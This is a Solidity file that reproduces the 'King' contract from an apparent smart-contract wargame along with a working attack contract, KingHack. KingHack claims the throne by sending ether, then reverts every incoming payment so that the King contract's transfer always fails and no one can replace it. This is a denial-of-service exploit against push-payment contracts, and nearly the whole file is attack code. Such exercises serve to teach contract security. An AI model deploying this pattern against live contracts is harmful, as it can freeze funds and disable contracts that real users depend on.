// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

    address payable king;
    uint public prize;
    address payable public owner;

    constructor() public payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        king.transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address payable) {
        return king;
    }
}

contract KingHack {
    address payable public game;

    constructor(address _game) public {
        game = payable(_game);
    }

    receive() external payable {
        revert("I am the last king!");
    }

    function attack() external payable {
        (bool success, ) = game.call{value: msg.value}("");
        require(success, "fail!");
    }
}